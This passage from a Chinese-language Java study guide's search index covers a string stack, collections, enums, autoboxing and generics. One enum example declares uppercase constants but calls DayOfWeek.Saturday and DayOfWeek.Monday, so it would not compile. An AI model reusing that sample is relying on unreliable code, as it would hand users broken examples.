ArrayStringStack() {\n        stack = new String[0];\n    }\n\n    @Override\n    public String pop() {\n        if (isEmpty()) {\n            throw new RuntimeException(\"Cannot pop from an empty stack.\");\n        }\n        String topElement = stack[0];\n        String[] newStack = new String[stack.length - 1];\n        System.arraycopy(this.stack, 1, newStack, 0, newStack.length);\n        this.stack = newStack;\n        return topElement;\n    }\n\n    @Override\n    public void push(String s) {\n        String[] newStack = new String[stack.length + 1];\n        newStack[0] = s;\n        System.arraycopy(this.stack, 0, newStack, 1, this.stack.length);\n        this.stack = newStack;\n    }\n\n    @Override\n    public boolean isEmpty() {\n        return stack.length == 0;\n    }\n\n    @Override\n    public String toString() {\n        if (isEmpty()) {\n            return \"Stack (top=empty): []\";\n        }\n        // Manually build the string representation\n        StringBuilder sb = new StringBuilder();\n        sb.append(\"Stack (top=\");\n        sb.append(stack[0]);\n        sb.append(\"): [\");\n        sb.append(stack[0]);\n        for (int i = 1; i &lt; stack.length; i++) {\n            sb.append(\", \");\n            sb.append(stack[i]);\n        }\n        sb.append(\"]\");\n        return sb.toString();\n    }\n</code></pre> <p>\u53ef\u4ee5\u770b\u5230\u7b2c\u56db\u5341\u884c\u6539\u5199\u4e86 <code>Object.toString</code></p>"},{"location":"cs/java/basics/w8/#collections","title":"Collections","text":"<p>Java \u63d0\u4f9b\u4e86\u4e00\u5957\u6807\u51c6\u7684\u6846\u67b6\u6765\u5b58\u50a8\u548c\u7ba1\u7406\u4e00\u7ec4\u5bf9\u8c61\uff08\u5c31\u50cf\u4e00\u4e2a\u201c\u96c6\u5408\u201d\uff09\u3002\u8fd9\u5c31\u662f Java \u96c6\u5408\u6846\u67b6\u3002</p> <p>Java \u96c6\u5408\u6846\u67b6\u4f7f\u7528\u63a5\u53e3\uff08\u5982 <code>Collection</code>, <code>List</code>, <code>Set</code>, <code>Queue</code>, <code>Deque</code>\uff09\u6765\u5b9a\u4e49\u4e0d\u540c\u7c7b\u578b\u96c6\u5408\u7684\u89c4\u8303\u3002</p> <p>\u6846\u67b6\u4e2d\u6ca1\u6709\u4e13\u95e8\u7684 <code>Stack</code> \u63a5\u53e3\uff0c\u4f46\u529f\u80fd\u66f4\u5f3a\u5927\u7684 <code>Deque</code>\uff08\u53cc\u7aef\u961f\u5217\uff09\u63a5\u53e3\u53ef\u4ee5\u5b8c\u7f8e\u5730\u7528\u4f5c\u6808\u3002\u63a8\u8350\u4f7f\u7528 <code>ArrayDeque</code> \u7c7b\u4f5c\u4e3a\u6808\u7684\u5b9e\u73b0\u3002</p> <p>Java \u4e2d\u6709\u4e00\u4e2a\u5386\u53f2\u9057\u7559\u7684 <code>java.util.Stack</code> \u7c7b\uff0c\u4f46\u56e0\u5176\u8bbe\u8ba1\u95ee\u9898\u548c\u8fc7\u65f6\uff0c\u4e0d\u63a8\u8350\u5728\u65b0\u4ee3\u7801\u4e2d\u4f7f\u7528\u3002</p> <pre><code>import java.util.List;          // List \u63a5\u53e3\nimport java.util.ArrayList;     // ArrayList \u7c7b (\u5b9e\u73b0 List)\nimport java.util.Set;           // Set \u63a5\u53e3\nimport java.util.HashSet;       // HashSet \u7c7b (\u5b9e\u73b0 Set)\nimport java.util.Map;           // Map \u63a5\u53e3\nimport java.util.HashMap;       // HashMap \u7c7b (\u5b9e\u73b0 Map)\nimport java.util.Deque;         // Deque \u63a5\u53e3 (\u53ef\u4f5c\u4e3a\u6808\u4f7f\u7528)\nimport java.util.ArrayDeque;    // ArrayDeque \u7c7b (\u5b9e\u73b0 Deque)\nimport java.util.Iterator;      // \u7528\u4e8e\u8fed\u4ee3\u5668\u904d\u5386\n</code></pre>"},{"location":"cs/java/basics/w9/","title":"9.0 Enums, Generic, SOLID","text":""},{"location":"cs/java/basics/w9/#enums","title":"Enums","text":""},{"location":"cs/java/basics/w9/#concepts","title":"Concepts","text":"<p>\u7f16\u7a0b\u5f53\u4e2d\u56fa\u5b9a\u4ee5\u53ca\u6709\u9650\u7684\u503c\u76f4\u63a5\u7528\u6574\u6570\u8868\u793a\u6709\u7f3a\u70b9\uff0c\u6bd4\u5982 1 \u5230\u5e95\u662f\u5468\u4e00\u8fd8\u662f\u5468\u65e5\uff1a\u7c7b\u578b\u4e0d\u5b89\u5168\u3001\u542b\u4e49\u4e0d\u660e\u786e\u3001\u7ef4\u62a4\u56f0\u96be\uff0c\u56e0\u6b64\u53ef\u4ee5\u4f7f\u7528\u679a\u4e3e</p> <pre><code>// \u5b9a\u4e49\u4e00\u4e2a\u8868\u793a\u661f\u671f\u7684\u679a\u4e3e\u7c7b\u578b\nenum DayOfWeek {\n    MONDAY, TUESDAY, WEDNESDAY, THURSDAY, FRIDAY, SATURDAY, SUNDAY\n}\n// \u5b9a\u4e49\u4e00\u4e2a\u8868\u793a\u4ea4\u901a\u65b9\u5f0f\u7684\u679a\u4e3e\u7c7b\u578b\nenum Transport {\n    BUS, TRAIN, FERRY, TRAM\n}\n</code></pre> <ul> <li>\u679a\u4e3e\u5e38\u91cf\u540d\u901a\u5e38\u4f7f\u7528\u5168\u5927\u5199\u5b57\u6bcd s</li> <li><code>\u679a\u4e3e\u540d.\u5e38\u91cf\u540d</code> \u7684\u65b9\u5f0f\u6765\u8bbf\u95ee\u5177\u4f53\u7684\u503c\u3002\u6ce8\u610f\uff1a\u4e0d\u4f7f\u7528 <code>new</code> \u5173\u952e\u5b57</li> </ul> <pre><code>DayOfWeek today = DayOfWeek.MONDAY;\nTransport myTransport = Transport.BUS;\n</code></pre> <p>\u8fd9\u6837\u53ef\u8bfb\u6027\u8f83\u5f3a\u4e5f\u53ef\u4ee5\u4f7f\u7528 <code>==</code> \u6bd4\u8f83</p> <ul> <li>Java \u4e2d\u7684 <code>enum</code> \u5b9e\u9645\u4e0a\u662f\u4e00\u79cd\u7279\u6b8a\u7684\u7c7b</li> <li>\u6240\u6709\u679a\u4e3e\u90fd\u9690\u5f0f\u5730\u7ee7\u627f\u81ea <code>java.lang.Enum</code> \u7c7b</li> <li>\u4e0d\u80fd\u518d\u7ee7\u627f\u5176\u4ed6\u7c7b\uff0c\u4e5f\u4e0d\u80fd\u88ab\u5176\u4ed6\u7c7b\u7ee7\u627f</li> <li>\u53ef\u4ee5\u50cf\u7c7b\u4e00\u6837\u62e5\u6709\u8bbf\u95ee\u4fee\u9970\u7b26<code>public, protected, private</code></li> </ul> <p>\u4ee5\u53ca\u5176\u548c <code>switch</code> \u8bed\u53e5\u4e5f\u53ef\u4ee5\u7ed3\u5408\u7684\u6bd4\u8f83\u597d</p> <pre><code>public static int typicalSpeed(Transport transport) {\n    switch (transport) {\n        case BUS:\n            return 50;\n        case TRAIN:\n            return 100;\n        case FERRY:\n            return 20;\n        case TRAM:\n            return 30;\n        default:\n            return 0;\n    }\n}\n\npublic static boolean isWeekend(DayOfWeek day) {\n    return day == DayOfWeek.Saturday || day == DayOfWeek.Sunday;\n}\n\npublic static void main(String[] args) {\n    DayOfWeek day = DayOfWeek.Monday;\n    System.out.println(isWeekend(day));\n    System.out.println(isWeekend(DayOfWeek.Saturday));\n    System.out.println(typicalSpeed(Transport.BUS));\n    System.out.println(typicalSpeed(Transport.TRAIN));\n}\n</code></pre>"},{"location":"cs/java/basics/w9/#functions","title":"Functions","text":"<ul> <li><code>values()</code></li> </ul> <p>\u679a\u4e3e\u542b\u6709\u5185\u7f6e\u65b9\u6cd5\uff0c<code>values()</code> \u9759\u6001\u65b9\u6cd5\uff0c\u8fd4\u56de\u4e00\u4e2a\u5305\u542b\u8be5\u679a\u4e3e\u6240\u6709\u5e38\u91cf\u7684\u6570\u7ec4</p> <pre><code>for (DayOfWeek day : DayOfWeek.values()) {\n    System.out.println(day);\n}\n</code></pre> <ul> <li><code>ordinal()</code>: \u8fd4\u56de\u679a\u4e3e\u5e38\u91cf\u5728\u58f0\u660e\u65f6\u7684\u5e8f\u53f7\uff08\u4ece 0 \u5f00\u59cb\uff09\u3002\u4f8b\u5982 <code>DayOfWeek.MONDAY.ordinal()</code> \u8fd4\u56de 0</li> </ul> <ul> <li><code>valueOf(String name)</code>: \u9759\u6001\u65b9\u6cd5\uff0c\u6839\u636e\u7ed9\u5b9a\u7684\u540d\u79f0\u5b57\u7b26\u4e32\u8fd4\u56de\u5bf9\u5e94\u7684\u679a\u4e3e\u5e38\u91cf</li> </ul> <p>\u679a\u4e3e\u7c7b\u53ef\u4ee5\u6dfb\u52a0\u81ea\u5df1\u7684\u65b9\u6cd5\uff0c\u4e5f\u53ef\u4ee5\u6dfb\u52a0\u81ea\u5df1\u7684\u6784\u9020\u51fd\u6570\u4ee5\u53ca\u5b57\u6bb5\uff0c\u6784\u9020\u5668\u9ed8\u8ba4\u5fc5\u987b <code>private</code> \u53ef\u4ee5\u4e0d\u5199\uff0c\u4e0d\u80fd\u4f7f\u7528 <code>new</code>\uff0c<code>JVM</code> \u4f1a\u5728\u521b\u5efa\u679a\u4e3e\u5e38\u91cf\u5b9e\u4f8b\u65f6\u81ea\u52a8\u8c03\u7528\u3002</p> <pre><code>enum Transport {\n    BUS(50), TRAIN(100), FERRY(20), TRAM(30); // \u8c03\u7528\u6784\u9020\u5668\n\n    private final int typicalSpeed; // \u6dfb\u52a0\u5b57\u6bb5\n\n    Transport(int typicalSpeed) { // \u6784\u9020\u5668 (\u9690\u5f0f private)\n        this.typicalSpeed = typicalSpeed;\n    }\n\n    public int getTypicalSpeed() { // \u6dfb\u52a0\u65b9\u6cd5\n        return typicalSpeed;\n    }\n}\n// \u4f7f\u7528: Transport.BUS.getTypicalSpeed() \u8fd4\u56de 50\n</code></pre> <p>\u53ef\u4ee5\u901a\u8fc7\u8fd9\u79cd\u65b9\u5f0f\u76f4\u63a5\u5728\u5185\u90e8\u5199\u597d\u503c\u5c31\u4e0d\u7528\u5199 <code>switch</code> \u8bed\u53e5</p>"},{"location":"cs/java/basics/w9/#autoboxing-and-unboxing","title":"Autoboxing and Unboxing","text":"<p>Java \u4e3a\u6bcf\u4e2a\u57fa\u672c\u6570\u636e\u7c7b\u578b (primitive type: <code>int</code>, <code>double</code>, <code>boolean</code>, <code>char</code> \u7b49) \u90fd\u63d0\u4f9b\u4e86\u4e00\u4e2a\u5bf9\u5e94\u7684\u5305\u88c5\u7c7b (wrapper class: <code>Integer</code>, <code>Double</code>, <code>Boolean</code>, <code>Character</code> \u7b49)\u3002\u8fd9\u4e9b\u5305\u88c5\u7c7b\u662f\u5bf9\u8c61\u3002</p> <ul> <li> <p>\u81ea\u52a8\u88c5\u7bb1 (Autoboxing): </p> <p>Java \u7f16\u8bd1\u5668\u81ea\u52a8\u5730\u5c06\u57fa\u672c\u6570\u636e\u7c7b\u578b\u7684\u503c\u8f6c\u6362\u4e3a\u5bf9\u5e94\u7684\u5305\u88c5\u7c7b\u5bf9\u8c61\u3002</p> </li> </ul> <ul> <li> <p>\u81ea\u52a8\u62c6\u7bb1 (Unboxing): </p> <p>Java \u7f16\u8bd1\u5668\u81ea\u52a8\u5730\u5c06\u5305\u88c5\u7c7b\u5bf9\u8c61\u8f6c\u6362\u4e3a\u5bf9\u5e94\u7684\u57fa\u672c\u6570\u636e\u7c7b\u578b\u7684\u503c\u3002</p> </li> </ul>"},{"location":"cs/java/basics/w9/#usage","title":"Usage","text":"<ul> <li>\u8d4b\u503c</li> </ul> <pre><code>Integer wrapperInt = 10;       // Autoboxing: int 10 -&gt; Integer(10)\nint primitiveInt = wrapperInt; // Unboxing: Integer(10) -&gt; int 10\n</code></pre> <ul> <li>\u6cdb\u578b\u96c6\u5408</li> </ul> <pre><code>List&lt;Integer&gt; list = new ArrayList&lt;&gt;();\nlist.add(1); // Autoboxing: int 1 -&gt; Integer(1)\nint first = list.get(0); // Unboxing: Integer(1) -&gt; int 1\n</code></pre> <p><code>ArrayList</code> \u8fd9\u79cd\u53ea\u80fd\u50a8\u5b58\u5bf9\u8c61\u4e0d\u80fd\u76f4\u63a5\u50a8\u5b58\u57fa\u672c\u6570\u636e\u7c7b\u578b\u7528\u8fd9\u79cd\u65b9\u6cd5\u4f20\u5165</p> <ul> <li>\u65b9\u6cd5\u8c03\u7528\uff1a\u7c7b\u578b\u81ea\u52a8\u8f6c\u6362</li> </ul> <pre><code>// \u65b9\u6cd5\u671f\u671b int\uff0c\u4f20\u5165 Integer -&gt; \u81ea\u52a8\u62c6\u7bb1\npublic static int sum(int a, int b) { return a + b; }\nInteger x = 1, y = 2;\nint result = sum(x, y);\n\n// \u65b9\u6cd5\u671f\u671b Double\uff0c\u4f20\u5165 double -&gt; \u81ea\u52a8\u88c5\u7bb1\npublic static Double max(Double a, Double b) { return a &gt; b ? a : b; }\nDouble maxVal = max(1.0, 2.0);\n</code></pre> <ul> <li>\u8fd0\u7b97\uff1a\u81ea\u52a8\u62c6\u7bb1\u6210\u57fa\u672c\u7c7b\u578b\u518d\u8ba1\u7b97</li> </ul> <pre><code>Integer a = 1;\nInteger b = 2;\nInteger c = a + b; // a, b \u62c6\u7bb1\u6210 int\uff0c\u76f8\u52a0\u540e\u7ed3\u679c 3 \u518d\u88c5\u7bb1\u6210 Integer \u8d4b\u7ed9 c\n</code></pre>"},{"location":"cs/java/basics/w9/#problems","title":"Problems","text":"<ul> <li> <p>reference</p> <p>\u81ea\u52a8\u88c5\u7bb1/\u62c6\u7bb1\u521b\u5efa\u7684\u662f\u4e0d\u540c\u7684\u5bf9\u8c61\uff08\u6216\u4ece\u7f13\u5b58\u83b7\u53d6\uff09\u3002\u5b83\u4e0d\u80fd\u7528\u6765\u50cf\u5bf9\u8c61\u5f15\u7528\u90a3\u6837\u5171\u4eab\u5bf9\u539f\u59cb\u57fa\u672c\u7c7b\u578b\u503c\u7684\u4fee\u6539\u3002</p> <pre><code>Integer a = 1;\nInteger b = a; // b \u6307\u5411\u548c a \u76f8\u540c\u7684 Integer \u5bf9\u8c61 (\u5bf9\u4e8e\u5c0f\u6570\u503c\uff0c\u901a\u5e38\u662f\u7f13\u5b58\u7684)\na += 2;       // \u5b9e\u9645\u662f: a = Integer.valueOf(a.intValue() + 2); a \u6307\u5411\u4e86\u65b0\u7684 Integer(3) \u5bf9\u8c61\nSystem.out.println(a); // 3\nSystem.out.println(b); // 1 (b \u4ecd\u7136\u6307\u5411\u539f\u6765\u7684 Integer(1) \u5bf9\u8c61)\n</code></pre> </li> </ul> <ul> <li> <p>performance</p> <p>\u8bbe\u8ba1\u5230\u5bf9\u8c61\u7684\u521b\u5efa\u548c\u8f6c\u6362\uff0c\u76f8\u6bd4\u76f4\u63a5\u4f7f\u7528\u57fa\u672c\u6570\u636e\u7c7b\u578b\u4f1a\u6709\u4e00\u5b9a\u6570\u636e\u5f00\u9500\uff1a\u65f6\u95f4\u4e0e\u7a7a\u95f4</p> </li> </ul> <ul> <li> <p><code>NullPointerException</code>\uff1a </p> <p>\u5982\u679c\u4e00\u4e2a\u5305\u88c5\u7c7b\u53d8\u91cf\u7684\u503c\u662f <code>null</code>\uff0c\u5728\u81ea\u52a8\u62c6\u7bb1\u65f6\u4f1a\u629b\u51fa <code>NullPointerException</code>\u3002</p> <pre><code>Integer i = null;\nint j = i; // \u5c1d\u8bd5\u62c6\u7bb1 null\uff0c\u4f1a\u629b\u51fa NullPointerException\n</code></pre> </li> </ul> <p>\u4f7f\u7528\u5305\u88c5\u7c7b/\u81ea\u52a8\u88c5\u7bb1</p> <ul> <li>\u5f53\u9700\u8981\u5c06\u57fa\u672c\u7c7b\u578b\u503c\u5b58\u5165\u53ea\u80fd\u5b58\u50a8\u5bf9\u8c61\u7684\u96c6\u5408\u7c7b\u65f6\uff08\u5982 <code>ArrayList&lt;Integer&gt;</code>\uff09\u3002</li> <li>\u5f53\u9700\u8981\u4f7f\u7528\u57fa\u672c\u7c7b\u578b\u503c\u4f5c\u4e3a\u6cdb\u578b\u7c7b\u578b\u53c2\u6570\u65f6\u3002</li> <li>\u5f53\u9700\u8981\u8c03\u7528\u9700\u8981\u5bf9\u8c61\u53c2\u6570\u7684\u65b9\u6cd5\u65f6\u3002</li> <li>\u5f53\u9700\u8981\u4f7f\u7528\u5305\u88c5\u7c7b\u63d0\u4f9b\u7684\u9759\u6001\u5de5\u5177\u65b9\u6cd5\u6216\u5e38\u91cf\u65f6\u3002</li> </ul>"},{"location":"cs/java/basics/w9/#wrapper-class-utilities","title":"Wrapper Class Utilities","text":"<p>\u5305\u88c5\u7c7b\u63d0\u4f9b\u4e86\u9759\u6001\u65b9\u6cd5\u4e0e\u5e38\u91cf</p> <p>\u6570\u503c\u7c7b\u578b (<code>Integer</code>, <code>Long</code>, <code>Double</code>, <code>Float</code> \u7b49):</p> <ul> <li>\u5b57\u7b26\u4e32\u8f6c\u6362: <code>Integer.parseInt(\"123\")</code>, <code>Double.parseDouble(\"3.14\")</code> (\u6ce8\u610f\u53ef\u80fd\u629b\u51fa <code>NumberFormatException</code>)\u3002</li> <li>\u6570\u503c\u8303\u56f4: <code>Integer.MAX_VALUE</code>, <code>Integer.MIN_VALUE</code>, <code>Double.POSITIVE_INFINITY</code>, <code>Double.NaN</code> \u7b49\u3002</li> <li>\u8fdb\u5236\u8f6c\u6362/\u4f4d\u8fd0\u7b97: <code>Integer.toBinaryString(10)</code>, <code>Integer.highestOneBit(10)</code> \u7b49\u3002</li> </ul> <p><code>Character</code>:</p> <ul> <li>\u5b57\u7b26\u5224\u65ad: <code>Character.isDigit('1')</code>, <code>Character.isLetter('a')</code>, <code>Character.isUpperCase('A')</code>, <code>Character.isWhitespace(' ')</code> \u7b49\u3002</li> <li>\u5927\u5c0f\u5199\u8f6c\u6362: <code>Character.toUpperCase('a')</code>, <code>Character.toLowerCase('Z')</code>\u3002</li> </ul>"},{"location":"cs/java/basics/w9/#generics","title":"Generics","text":"<p>\u60f3\u8c61\u4e00\u4e0b\uff0c\u6211\u4eec\u60f3\u521b\u5efa\u4e00\u4e2a\u6808\uff08Stack\uff09\u6570\u636e\u7ed3\u6784\u3002\u5982\u679c\u6211\u4eec\u4e3a <code>String</code> \u7c7b\u578b\u5199\u4e00\u4e2a <code>StringStack</code> \uff0c\u90a3\u4e48\u5f53\u6211\u4eec\u60f3\u5b58 <code>int</code> \u6216\u8005\u5176\u4ed6\u7c7b\u578b\u65f6\uff0c\u5c31\u9700\u8981\u91cd\u5199\u6574\u4e2a\u7c7b \u3002\u8fd9\u975e\u5e38\u4f4e\u6548\u3002</p> <ul> <li>\u4e00\u4e2a\u65b9\u6cd5\u662f\u4f7f\u7528 <code>Object</code> \u7c7b\u6765\u521b\u5efa <code>ObjectStack</code>\u7ed3\u5408 Autoboxing \u4ee5\u53ca Unboxing \u7279\u6027\uff0c\u751a\u81f3\u53ef\u4ee5\u50a8\u5b58\u539f\u59cb\u7c7b\u578b\uff0c\u4f46\u662f\u53d6\u51fa\u6570\u636e\u7684\u65f6\u5019\u9700\u8981\u5f3a\u5236\u7c7b\u578b\u8f6c\u6362\uff1a<code>int three = (Integer) ss.pop();</code></li> </ul> <ul> <li>\u5982\u679c\u5728 <code>pop</code> \u65f6\u8f6c\u6362\u7684\u7c7b\u578b\u4e0e\u5b58\u5165\u65f6\u7684\u7c7b\u578b\u4e0d\u5339\u914d\uff0c\u7a0b\u5e8f\u4e0d\u4f1a\u5728\u7f16\u8bd1\u65f6\u62a5\u9519\uff0c\u800c\u662f\u5728\u8fd0\u884c\u65f6\u629b\u51fa <code>ClassCastException</code> \u9519\u8bef \u3002\u8fd9\u76f8\u5f53\u4e8e\u4e22\u5931\u4e86 Java \u5f3a\u5927\u7684\u7c7b\u578b\u68c0\u67e5\u529f\u80fd \u3002  </li> </ul> <p>\u800c\u6cdb\u578b\u53ef\u4ee5\u66f4\u597d\u5730\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\uff1a\u5728\u7c7b\u540d\u540e\u9762\u52a0\u4e0a <code>&lt;T&gt;</code> \u8fd9\u91cc\u7684 T \u5c31\u662f\u7c7b\u578b\u53c2\u6570 Type Parameter\uff0c\u4ed6\u662f\u4e00\u4e2a\u5360\u4f4d\u7b26\u4ee3\u8868\u67d0\u79cd\u5177\u4f53\u7684\u7c7b\u578b\uff0c\u56e0\u6b64\u53ef\u4ee5\u7528\u4efb\u4f55\u5408\u6cd5\u6807\u8bc6\u4ee3\u66ff T</p> <pre><code>public class GenericStack&lt;T&gt; {\n    public GenericStack(int capacity) { ... }\n    public void push(T s) { ... } // \u65b9\u6cd5\u53c2\u6570\u4f7f\u7528\u7c7b\u578b\u53c2\u6570 T\n    public T pop() { ... }         // \u8fd4\u56de\u503c\u4f7f\u7528\u7c7b\u578b\u53c2\u6570 T\n}\n</code></pre> <p>\u90a3\u4e48\u5728\u5b9e\u4f8b\u5316\u7684\u65f6\u5019\u9700\u8981\u4e3a\u5176\u6307\u5b9a\u4e00\u4e2a\u5177\u4f53\u7684\u7c7b\u578b\u53c2\u6570\u5982 Integer \u6216 String</p> <pre><code>GenericStack&lt;Integer&gt; intStack = new GenericStack&lt;Integer&gt;(5); // T \u88ab\u6307\u5b9a\u4e3a Integer\nintStack.push(3); // OK\n// intStack.push(\"Hello\"); // \u7f16\u8bd1\u65f6\u9519\u8bef\uff01\u7c7b\u578b\u4e0d\u5339\u914d\nint value = intStack.pop(); // \u4e0d\u9700\u8981\u5f3a\u5236\u7c7b\u578b\u8f6c\u6362\n</code></pre> <ul> <li>\u4f7f\u7528 generics \u5728\u7f16\u8bd1\u65f6\u4f1a\u68c0\u67e5\u7c7b\u578b\u662f\u5426\u5339\u914d\uff0c\u907f\u514d\u4e86\u8fd0\u884c\u65f6\u7684 <code>ClassCastException</code></li> <li>\u53ea\u9700\u5199\u4e00\u6b21 <code>GenericStack&lt;T&gt;</code> \u5c31\u53ef\u4ee5\u7528\u4e8e\u4efb\u4f55\u975e\u539f\u59cb\u7c7b\u578b</li> <li>\u65e0\u9700\u5f3a\u5236\u8f6c\u6362</li> </ul> <p>\u7c7b\u578b\u53c2\u6570\u5fc5\u987b\u662f\u7c7b\u7c7b\u578b\uff0c\u4e0d\u80fd\u662f\u539f\u59cb\u7c7b\u578b\uff08\u5982 int\uff09\u3002\u4f46\u7531\u4e8e\u81ea\u52a8\u88c5\u7bb1/\u62c6\u7bb1\uff0c\u4f7f\u7528\u539f\u59cb\u7c7b\u578b\u901a\u5e38\u6ca1\u6709\u969c\u788d \u3002   </p>"},{"location":"cs/java/basics/w9/#multiple-generics-parameters","title":"Multiple Generics Parameters","text":"<pre><code>public class GenericPair&lt;T, V&gt; {\n    public T first;\n    public V second;\n    public GenericPair(T first, V second) {\n        this.first = first;\n        this.second = second;\n    }\n}\n</code></pre> <p>\u6cdb\u578b\u7c7b\u53ef\u4ee5\u6709\u591a\u4e2a\u7c7b\u578b\u53c2\u6570\uff0c\u7528\u9017\u53f7\u5206\u9694\u3002</p> <pre><code>// \u521b\u5efa\u4e00\u4e2a\u5b58\u50a8 &lt;Integer, String&gt; \u5bf9\u7684 ArrayList\nvar studentList = new ArrayList&lt;GenericPair&lt;Integer, String&gt;&gt;();\nstudentList.add(new GenericPair&lt;Integer, String&gt;(10243549, \"Alan Turing\"));\n</code></pre> <p>\u7b2c\u4e8c\u884c\u51fa\u73b0\u4e86 <code>var</code> \u5173\u952e\u8bcd\uff0c\u662f Java 10 \u5f15\u5165\u7684\u4e00\u4e2a\u5173\u952e\u5b57</p> <ul> <li>\u7528\u4e8e\u5c40\u90e8\u53d8\u91cf\u7c7b\u578b\u63a8\u65ad Local Variable Type Inference</li> </ul> <pre><code>// \u539f\u672c\u9700\u8981\u8fd9\u6837\u5199\uff0c\u7c7b\u578b\u540d\u79f0\u5f88\u957f:\nArrayList&lt;GenericPair&lt;Integer, String&gt;&gt; studentList = new ArrayList&lt;GenericPair&lt;Integer, String&gt;&gt;();\n</code></pre> <p>\u7528 <code>var</code>\u66ff\u4ee3\u540e\u7f16\u8bd1\u5668\u53ef\u4ee5\u81ea\u52a8\u4ece\u53f3\u8fb9\u63a8\u65ad\u51fa\u5de6\u8fb9\u51cf\u5c11\u5197\u4f59\uff0c\u53ea\u80fd\u7528\u4e8e\u5c40\u90e8\u53d8\u91cf</p>"},{"location":"cs/java/basics/w9/#bounded-type-parameters","title":"Bounded Type Parameters","text":"<p>\u6709\u65f6\u6211\u4eec\u5e0c\u671b\u9650\u5236\u53ef\u4ee5\u7528\u4f5c\u7c7b\u578b\u53c2\u6570\u7684\u7c7b\u578b\u8303\u56f4\u3002\u4f7f\u7528 <code>extends</code> \u5173\u952e\u5b57\uff0c\u4f8b\u5982 <code>&lt;T extends SuperClass&gt;</code>\u3002\u8fd9\u8868\u793a <code>T</code> \u5fc5\u987b\u662f <code>SuperClass</code> \u672c\u8eab\u6216\u8005\u662f\u5b83\u7684\u5b50\u7c7b \u3002<code>SuperClass</code> \u5c31\u662f\u8fd9\u4e2a\u7c7b\u578b\u53c2\u6570\u7684\u4e0a\u754c (Upper Bound) \u3002 </p> <pre><code>abstract class Bird { }\nclass Emu extends Bird { }\nclass Hawk extends Bird { }\n\nclass BirdPair&lt;T extends Bird&gt; { // T \u5fc5\u987b\u662f Bird \u6216\u5176\u5b50\u7c7b\n    public T first;\n    public T second;\n    public BirdPair (T first, T second) { ... }\n}\n</code></pre> <pre><code>var emuPair = new BirdPair&lt;Emu&gt;(new Emu(), new Emu()); // OK\nvar hawkPair = new BirdPair&lt;Hawk&gt;(new Hawk(), new Hawk()); // OK\nvar birdPair = new BirdPair&lt;Bird&gt;(new Emu(), new Hawk()); // OK\n// var badPair = new BirdPair&lt;String&gt;(\"Hello\", \"World\"); // \u7f16\u8bd1\u65f6\u9519\u8bef\uff01String \u4e0d\u662f Bird \u7684\u5b50\u7c7b\n</code></pre> <p><code>&lt;T&gt;</code> \u5b9e\u9645\u4e0a\u7b49\u4ef7\u4e8e <code>&lt;T extends Object&gt;</code>\uff0c\u56e0\u4e3a\u6240\u6709\u7c7b\u90fd\u7ee7\u627f\u81ea <code>Object</code> </p>"},{"location":"cs/java/basics/w9/#generic-interfaces","title":"Generic Interfaces","text":"<p>\u63a5\u53e3\u4e5f\u53ef\u4ee5\u662f\u6cdb\u578b\u7684\uff0c\u62e5\u6709\u7c7b\u578b\u53c2\u6570\uff0c\u7c7b\u578b\u53c2\u6570\u53ef\u4ee5\u7528\u5728\u63a5\u53e3\u7684\u65b9\u6cd5\u7b7e\u540d\u4e2d\u3002<code>Comparable&lt;T&gt;</code>\u5c31\u662f\u4e00\u4e2a\u6cdb\u578b\u63a5\u53e3\uff0c\u5b83\u8981\u6c42\u5b9e\u73b0 <code>compareTo(To)</code> \u65b9\u6cd5\uff0c\u7528\u4e8e\u6bd4\u8f83\u5f53\u524d\u5bf9\u8c61\u548c\u53e6\u4e00\u4e2a <code>T</code> \u7c7b\u578b\u7684\u5bf9\u8c61</p>"},{"location":"cs/java/basics/w9/#with-bounded-type-parameters","title":"With bounded type parameters","text":"<pre><code>public class RunningMaximum&lt;T extends Comparable&lt;T&gt;&gt; { // T \u5fc5\u987b\u5b9e\u73b0 Comparable&lt;T&gt;\n    private T currentMax;\n    public RunningMaximum (T initial) { currentMax = initial; }\n    public void addNumber (T number) {\n        if (number.compareTo(currentMax) &gt; 0) { // \u8c03\u7528 compareTo \u65b9\u6cd5\n            currentMax = number;\n        }\n    }\n    public T getCurrentMax() { return currentMax; }\n}\n</code></pre> <ul> <li>\u53ef\u4ee5\u5c06\u6cdb\u578b\u63a5\u53e3\u7528\u4f5c\u6709\u754c\u7c7b\u578b\u53c2\u6570\u7684\u8fb9\u754c\u3002</li> <li>\u53ef\u4ee5\u7528\u4e8e\u4efb\u4f55\u5b9e\u73b0\u4e86 <code>Comparable</code> \u7684\u7c7b\u578b\uff0c\u5982 <code>Integer</code>, <code>String</code> \u7b49</li> </ul> <pre><code>RunningMaximum&lt;Integer&gt; runningMax = new RunningMaximum&lt;&gt;(1); // \u4f7f\u7528 Integer\nrunningMax.addNumber(5);\nSystem.out.println(runningMax.getCurrentMax()); // \u8f93\u51fa 5\n</code></pre> <p>\u5b9e\u73b0\u8fc7\u7a0b\u4e2d\u7b2c\u4e00\u884c\u5728 <code>Java 7</code>\u4e4b\u524d\u4f60\u5fc5\u987b\u8fd9\u6837\u5199\uff1a</p> <pre><code>RunningMaximum&lt;Integer&gt; runningMax = new RunningMaximum&lt;Integer&gt;(1);\n// ^^^^^^^^^^^^^^^^^^^             ^^^^^^^^^^^^^^^^^^^^^^^^^^^\n// (\u7c7b\u578b\u58f0\u660e)                        (\u6784\u9020\u51fd\u6570\u8c03\u7528\u65f6\u6307\u5b9a\u7c7b\u578b)\n</code></pre> <p>Java 7 \u53ca\u4e4b\u540e: \u5f15\u5165\u4e86\u83f1\u5f62\u8fd0\u7b97\u7b26 <code>&lt;&gt;</code>\u3002\u5982\u679c\u4f60\u5728\u5de6\u4fa7\u663e\u5f0f\u58f0\u660e\u4e86\u7c7b\u578b <code>RunningMaximum&lt;Integer&gt; runningMax</code>\uff0c\u7f16\u8bd1\u5668\u5c31\u53ef\u4ee5\u4ece\u5de6\u4fa7\u63a8\u65ad\u51fa\u53f3\u4fa7\u7684\u6cdb\u578b\u7c7b\u578b\uff0c\u6240\u4ee5\u4f60\u53ef\u4ee5\u5199\u6210 <code>RunningMaximum&lt;Integer&gt; runningMax = new RunningMaximum&lt;&gt;(1);</code>\uff0c\u53f3\u4fa7 <code>&lt;&gt;</code> \u4e2d\u65e0\u9700\u91cd\u590d\u7c7b\u578b\u3002</p> <p>Java 10 \u53ca\u4e4b\u540e: \u5f15\u5165\u4e86 